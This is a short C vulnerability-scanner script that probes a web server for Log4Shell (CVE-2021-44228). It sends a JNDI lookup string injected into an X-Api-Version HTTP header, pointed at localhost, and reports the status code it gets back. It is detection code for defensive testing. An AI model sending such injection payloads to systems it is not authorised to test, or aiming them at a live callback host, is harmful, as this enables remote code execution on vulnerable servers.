/* http-vuln-cve2021-44228-3 - Log4Shell JNDI probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[4096];
    int code;
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/", NULL,
                        "X-Api-Version: ${jndi:ldap://127.0.0.1/a}\r\n",
                        NULL, NULL, resp, sizeof(resp));
    code = ar_http_status(resp);
    if (n > 0 && code > 0) {
        ar_out(ctx, "CVE-2021-44228 probe sent (HTTP %d); "
               "JNDI callback required to confirm", code);
    } else {
        ar_out(ctx, "CVE-2021-44228: no response");
    }
    return 0;
}
